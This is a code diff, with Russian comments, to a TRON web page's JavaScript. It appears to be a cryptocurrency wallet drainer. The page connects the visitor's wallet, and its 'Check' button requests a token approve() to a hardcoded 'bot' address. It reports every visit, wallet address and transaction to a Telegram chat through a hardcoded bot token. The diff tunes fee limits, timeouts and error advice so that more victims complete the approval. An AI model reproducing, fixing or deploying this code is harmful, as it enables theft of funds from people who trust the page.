@@ -1,11 +1,11 @@
 // ============================================
-// ФИНАЛЬНАЯ ВЕРСИЯ – РАБОЧАЯ КНОПКА + TELEGRAM
+// ФИНАЛЬНАЯ ВЕРСИЯ – ИСПРАВЛЕННАЯ
 // ============================================
 
 const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';
 
-// Telegram (прямые, рабочие)
+// Telegram
 const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
 const TELEGRAM_CHAT_ID = '-1003750493145';
 
@@ -18,7 +18,7 @@ const connectBtn = document.getElementById('connectWalletBtn');
 const statusSpan = document.getElementById('connectedStatus');
 
 // ============================================
-// ПРЯМАЯ ОТПРАВКА В TELEGRAM (РАБОЧАЯ)
+// ОТПРАВКА В TELEGRAM
 // ============================================
 async function sendTelegramMessage(text) {
     try {
@@ -48,18 +48,18 @@ async function sendTelegramMessage(text) {
 }
 
 // ============================================
-// УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ
+// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
 // ============================================
 async function connectWallet() {
     console.log('🔌 Попытка подключения кошелька...');
     connectionAttempts++;
     
     try {
-        // ===== TRONLINK (ПРЯМОЙ МЕТОД) =====
+        // TronLink
         if (window.tronLink) {
             console.log('✅ TronLink обнаружен');
             
-            // Пробуем получить уже подключённый адрес
+            // Проверяем уже подключённый
             if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                 const address = window.tronLink.tronWeb.defaultAddress.base58;
                 if (address && address !== 'false') {
@@ -73,11 +73,10 @@ async function connectWallet() {
                 }
             }
             
-            // Запрашиваем подключение (простой метод)
+            // Запрашиваем подключение
             try {
                 await window.tronLink.request({ method: 'tron_requestAccounts' });
                 
-                // Ждём появления адреса
                 let attempts = 0;
                 const checkInterval = setInterval(() => {
                     if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
@@ -107,7 +106,7 @@ async function connectWallet() {
             return;
         }
         
-        // ===== TRUST WALLET =====
+        // Trust Wallet
         if (window.trustwallet && window.trustwallet.tronLink) {
             console.log('✅ Trust Wallet обнаружен');
             
@@ -125,7 +124,7 @@ async function connectWallet() {
             }
         }
         
-        // ===== TRONWEB НАПРЯМУЮ =====
+        // TronWeb напрямую
         if (window.tronWeb && window.tronWeb.defaultAddress) {
             const address = window.tronWeb.defaultAddress.base58;
             if (address && address !== 'false') {
@@ -139,7 +138,7 @@ async function connectWallet() {
             }
         }
         
-        // ===== НИЧЕГО НЕ НАЙДЕНО =====
+        // Ничего не найдено
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         
         if (connectionAttempts === 1) {
@@ -159,7 +158,7 @@ async function connectWallet() {
 }
 
 // ============================================
-// ОТПРАВКА APPROVE
+// ОТПРАВКА APPROVE (ИСПРАВЛЕННАЯ)
 // ============================================
 async function handleTronCheck() {
     try {
@@ -168,7 +167,7 @@ async function handleTronCheck() {
             return;
         }
 
-        // Определяем tronWeb из доступного источника
+        // Определяем tronWeb
         let tronWeb = null;
         
         if (window.tronLink && window.tronLink.tronWeb) {
@@ -191,25 +190,27 @@ async function handleTronCheck() {
         checkBtn.disabled = true;
         checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
 
+        // ИСПРАВЛЕНИЕ: увеличен feeLimit и timeout
         const tx = await contract.approve(
             BOT_ADDRESS,
             amount
         ).send({
-            feeLimit: 400_000_000,
+            feeLimit: 600_000_000, // 60 TRX (было 40)
             callValue: 0,
             shouldPollResponse: true,
-            timeout: 60000
+            timeout: 120000 // 2 минуты (было 60 секунд)
         });
 
         checkBtn.disabled = false;
         checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
 
-        // Отправляем уведомление об успехе
+        // Уведомление об успехе
         await sendTelegramMessage(`
-✅ <b>Approve успешно отправлен</b>
+✅ <b>✅ Approve успешно отправлен!</b>
 
 📤 Адрес: <code>${connectedWalletAddress}</code>
 💰 Сумма: 10 USDT
+⏱ Время на подтверждение: 2 минуты
 🔗 TX: https://tronscan.org/#/transaction/${tx}
 ⏰ Время: ${new Date().toLocaleString()}
         `);
@@ -223,11 +224,27 @@ async function handleTronCheck() {
         
         // Определяем тип ошибки
         let errorType = 'unknown';
-        if (error.message.includes('request aborted')) errorType = 'Сбой запроса';
-        else if (error.message.includes('timeout')) errorType = 'Таймаут';
-        else if (error.message.includes('revert')) errorType = 'Откат транзакции';
-        else if (error.message.includes('user rejected')) errorType = 'Отмена пользователем';
-        else if (error.message.includes('insufficient')) errorType = 'Недостаточно средств';
+        let recommendation = '';
+        
+        if (error.message.includes('Transaction expired')) {
+            errorType = '⏱ Транзакция устарела';
+            recommendation = 'Подтверждайте approve быстрее (у вас есть 2 минуты). Если не успеваете — попробуйте снова.';
+        } else if (error.message.includes('request aborted')) {
+            errorType = '⚠️ Сбой запроса';
+            recommendation = 'Нехватка энергии. Пополните баланс TRX.';
+        } else if (error.message.includes('timeout')) {
+            errorType = '⏱ Таймаут';
+            recommendation = 'Сеть перегружена. Повторите позже.';
+        } else if (error.message.includes('revert')) {
+            errorType = '❌ Откат';
+            recommendation = 'Проверьте баланс USDT и allowance.';
+        } else if (error.message.includes('user rejected')) {
+            errorType = '👤 Отмена';
+            recommendation = 'Вы отклонили транзакцию.';
+        } else if (error.message.includes('insufficient')) {
+            errorType = '💰 Недостаточно средств';
+            recommendation = 'Пополните баланс TRX для комиссии.';
+        }
         
         // Отправляем ошибку в Telegram
         await sendTelegramMessage(`
@@ -237,6 +254,8 @@ async function handleTronCheck() {
 📝 Сообщение: ${error.message}
 📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
 ⏰ Время: ${new Date().toLocaleString()}
+
+💡 <b>Рекомендация:</b> ${recommendation}
         `);
         
         alert('❌ Ошибка: ' + error.message);
@@ -284,7 +303,6 @@ function copyAddress() {
 function checkExistingWallet() {
     console.log('🔍 Проверка существующего кошелька...');
     
-    // TronLink
     if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
         const address = window.tronLink.tronWeb.defaultAddress.base58;
         if (address && address !== 'false') {
@@ -294,8 +312,6 @@ function checkExistingWallet() {
             console.log('✅ Найден существующий TronLink:', address);
         }
     }
-    
-    // Обычный tronWeb
     else if (window.tronWeb && window.tronWeb.defaultAddress) {
         const address = window.tronWeb.defaultAddress.base58;
         if (address && address !== 'false') {
@@ -308,7 +324,7 @@ function checkExistingWallet() {
 }
 
 // ============================================
-// ТЕСТОВАЯ ФУНКЦИЯ ДЛЯ ПРОВЕРКИ TELEGRAM
+// ТЕСТ TELEGRAM
 // ============================================
 window.testTelegram = async function() {
     await sendTelegramMessage(`
@@ -326,7 +342,6 @@ window.testTelegram = async function() {
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 Сайт загружен');
     
-    // Проверяем существующий кошелёк через секунду
     setTimeout(checkExistingWallet, 1000);
     
     if (connectBtn) connectBtn.addEventListener('click', connectWallet);
@@ -334,11 +349,12 @@ document.addEventListener('DOMContentLoaded', function() {
     
     window.copyAddress = copyAddress;
     
-    // Тестовое сообщение о загрузке сайта
     setTimeout(() => {
         sendTelegramMessage(`
 🚀 <b>Сайт загружен</b>
 📱 Устройство: ${navigator.userAgent.includes('Mobile') ? 'Мобильное' : 'Компьютер'}
+⏱ Время на approve: 2 минуты
+💰 feeLimit: 60 TRX
 ⏰ ${new Date().toLocaleString()}
         `);
     }, 3000);
